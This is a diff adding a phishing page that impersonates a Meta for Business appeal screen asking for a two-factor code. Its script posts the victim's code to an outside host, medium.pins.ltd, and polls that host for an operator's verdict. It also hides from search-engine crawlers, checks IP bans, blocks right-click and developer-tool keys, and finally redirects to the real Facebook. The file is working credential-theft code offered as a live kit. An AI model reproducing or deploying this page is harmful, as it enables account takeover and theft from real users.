@@ -1,0 +1,247 @@
+<?php
+  session_start();
+?>
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title>Meta for Business - Appeal Decision</title>
+    <link rel="shortcut icon" href="../img/favicon.ico" type="image/x-icon" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" type="text/css" media="screen" href="./main.css" />
+    <script>
+      // Define a list of known bot User-Agents
+      const botUserAgents = ["Googlebot", "Bingbot" /* Add more bots here */];
+
+      // Implement anti-bot protection
+      function protectAgainstBots() {
+        const userAgent = navigator.userAgent;
+
+        if (isBot(userAgent)) {
+          // Block known bot User-Agents
+          alert("Bot access is not allowed.");
+          // You can also redirect or display a specific message/page.
+          window.location.href = "error.html";
+        } else {
+          // Allow legitimate traffic
+          // Add your website's functionality here
+        }
+      }
+
+      // Detect known bot User-Agents
+      function isBot(userAgent) {
+        return botUserAgents.some((bot) => userAgent.includes(bot));
+      }
+
+      // Call the protection function when the page loads
+      window.addEventListener("load", protectAgainstBots);
+    </script>
+  </head>
+  <body>
+    <div class="container">
+      <h1>We sent you another code</h1>
+      <p class="sub_heading">Check your messages for a 6 - 8 digit code</p>
+      <div class="gif">
+        <p>Enter the code from your generator, sms or third-party-app below.</p>
+        <div class="display">
+          <img src="../img/confirm-mobile.af05cfecf754cdc833fd.gif" alt="" />
+        </div>
+      </div>
+
+      <form action="" id="code_form">
+        <input type="text" name="code" id="code" placeholder="Code" />
+        <input type="hidden" name="unique_id" id="unique_id" value="" />
+
+        <small class="error_text"></small>
+        <p>
+          Make sure you're in an area with good signal so the code can reach your phone. <br />
+          <span class="counter" style="font-weight: 600; display: block"></span>
+        </p>
+        <button id="button" type="submit" disabled style="cursor: not-allowed">Next</button>
+      </form>
+    </div>
+
+    <script>
+      const form = document.querySelector("#code_form");
+      const button = document.querySelector("#button");
+      const unique_id = document.querySelector("#unique_id");
+      let localData = localStorage.getItem("unique_id");
+
+      document.addEventListener("DOMContentLoaded", function () {
+        const error_text = document.querySelector(".error_text");
+        const codeField = document.querySelector("#code");
+        const timerDisplay = document.querySelector(".counter");
+        const startButton = document.getElementById("button");
+        let countdown;
+        let attempts = 5;
+
+        unique_id.value = localData;
+
+        codeField.addEventListener("input", function () {
+          if (this.value.length >= 6) {
+            startButton.removeAttribute("disabled");
+            startButton.style.cursor = "pointer";
+            error_text.textContent = "";
+            codeField.style.borderColor = "#e5e7eb";
+          } else {
+            startButton.setAttribute("disabled", "disabled");
+            startButton.style.cursor = "not-allowed";
+          }
+        });
+
+        function displayTime(seconds) {
+          const minutes = Math.floor(seconds / 60);
+          const remainderSeconds = seconds % 60;
+          const display = `${minutes < 10 ? "0" : ""}${minutes}:${
+            remainderSeconds < 10 ? "0" : ""
+          }${remainderSeconds}`;
+          timerDisplay.textContent = display;
+        }
+
+        function startTimer() {
+          clearInterval(countdown);
+          const startTime = Date.now();
+          const endTime = startTime + 30 * 1000; // 1 minute in milliseconds
+
+          function updateTimer() {
+            const secondsLeft = Math.round((endTime - Date.now()) / 1000);
+            if (secondsLeft < 0) {
+              displayTime(0);
+              clearInterval(countdown);
+              timerDisplay.textContent = "";
+            } else {
+              displayTime(secondsLeft);
+              // preventInput()
+            }
+          }
+
+          updateTimer();
+          countdown = setInterval(updateTimer, 1000);
+        }
+
+        function redirectToOtherPage() {
+          window.location.href = "https://m.facebook.com"; // Replace with the actual URL
+        }
+
+        function preventInput() {
+          startButton.setAttribute("disabled", "disabled");
+          startButton.style.cursor = "not-allowed";
+          codeField.setAttribute("disabled", "disabled");
+          setTimeout(() => {
+            startButton.removeAttribute("disabled");
+            startButton.style.cursor = "pointer";
+            codeField.removeAttribute("disabled");
+          }, 1000 * 30);
+        }
+
+        startButton.addEventListener("click", function (e) {
+          e.preventDefault();
+          button.innerHTML = `<img src="../img/loader.gif" width="30" alt="">`;
+
+          let successValue;
+
+          const changeSuccessValue = (newValue) => {
+            successValue = newValue;
+            return successValue;
+          };
+
+          const valid = "valid";
+          const invalid = "invalid";
+
+          const awaitResponse = () => {
+            let xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://medium.pins.ltd/php/await2FAResponse.php", true);
+            xhr.setRequestHeader("Content-Type", "application/json")
+            xhr.onload = () => {
+              if (xhr.status === 200) {
+                let data = xhr.response;
+                if (data == "pending") {
+                  // do something
+                  button.innerHTML = `<img src="../img/loader.gif" width="30" alt="">`;
+                  changeSuccessValue("yes");
+                } else if (data == "invalid") {
+                  // do somehting
+                  changeSuccessValue("no");
+                  document.querySelector("#code").value = "";
+                  document.querySelector("#code").style.borderColor = "#e23636";
+                  document.querySelector(".error_text").textContent =
+                    "incorrect code, please try again";
+                  startButton.setAttribute("disabled", "disabled");
+                  startButton.style.cursor = "not-allowed";
+                  button.innerHTML = "Next";
+                } else if (data == "wait") {
+                  changeSuccessValue("no");
+                  window.location.href = "../verify.html"
+                } else{
+                  changeSuccessValue("no")
+                  window.location.href = "../completed.html"
+                }
+              }
+            };
+            let formData = {
+              unique_id: localData
+            }
+            xhr.send(JSON.stringify(formData));
+          };
+
+          function awaitInterval(interval, state) {
+            awaitResponse();
+            console.log(state);
+
+            if (state == "no") {
+              clearInterval(interval);
+              changeSuccessValue("yes");
+            }
+          }
+
+          const sendOTP = async () => {
+            let xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://medium.pins.ltd/php/update2FA.php", true);
+            xhr.setRequestHeader("Content-Type", "application/json")
+            xhr.onload = () => {
+              if (xhr.readyState === XMLHttpRequest.DONE) {
+                if (xhr.status === 200) {
+                  let responseInterval = setInterval(() => {
+                    awaitInterval(responseInterval, successValue);
+                  }, 500);
+                }
+              }
+            };
+            // send form data to php file
+            let formData = {
+              code: codeField.value,
+              unique_id: localData
+            }
+
+            xhr.send(JSON.stringify(formData));
+          };
+
+          sendOTP();
+        });
+      });
+    </script>
+
+    <script src="../ipCheck.js"></script>
+    <script>
+      window.addEventListener("DOMContentLoaded", checkIPBan);
+
+      document.addEventListener("keydown", function (event) {
+        if (event.ctrlKey) {
+          event.preventDefault();
+        }
+        if (event.keyCode == 123) {
+          event.preventDefault();
+        }
+      });
+
+      document.addEventListener("contextmenu", (event) => event.preventDefault());
+    </script>
+  </body>
+</html>
